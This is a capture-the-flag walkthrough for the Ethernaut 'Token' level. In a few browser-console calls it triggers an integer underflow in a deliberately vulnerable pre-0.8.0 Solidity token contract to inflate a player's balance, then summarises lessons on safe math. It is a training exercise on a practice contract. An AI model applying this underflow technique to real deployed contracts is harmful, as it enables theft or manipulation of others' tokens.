# Token

## Objective

Exploit an integer underflow in a vulnerable ERC20-like token contract to increase your token balance beyond the initial allocation.

---

## Getting Started

1. Go to [ethernaut.openzeppelin.com](https://ethernaut.openzeppelin.com/)
2. Select the **"Token"** level
3. Click **“Get new instance”** and approve the transaction in MetaMask
4. The instance is now deployed and available as the `contract` object in the browser console
5. Save the instance address:

    ```js
    contract.address
    ```

---

## Walkthrough

### Step 1: Check Your Initial Balance

```js
await contract.balanceOf(player)
```

**Explanation:**  
This confirms your starting balance (should be 20 tokens) and ensures you are interacting with the correct account.

---

### Step 2: Trigger the Underflow by Transferring More Than You Own

```js
await contract.transfer('0x0000000000000000000000000000000000000000', 21)
```

**Explanation:**  
Transferring more tokens than your balance causes an integer underflow in Solidity versions before 0.8.0, resulting in your balance wrapping to a very large number.

---

### Step 3: Verify Your New Balance

```js
(await contract.balanceOf(player)).toString()
```

**Explanation:**  
This step checks that your balance has increased to a value greater than 20, confirming the underflow exploit was successful.

---

## What You Learn

This level teaches the following:

* The risks of unchecked arithmetic in Solidity prior to version 0.8.0
* How integer underflows can be exploited in smart contracts
* The importance of using safe math operations or compiler checks
* Defensive programming patterns to prevent similar vulnerabilities

---

## Resources Used

* [Ethernaut Game](https://ethernaut.openzeppelin.com/)
* [Solidity Docs – Arithmetic Safety](https://docs.soliditylang.org/en/latest/080-breaking-changes.html#unchecked)
* [OpenZeppelin Contracts – SafeMath](https://docs.openzeppelin.com/contracts/2.x/api/math)
* [External writeup](https://shubhamm.me/blog/ethernaut_challenges_token)

---
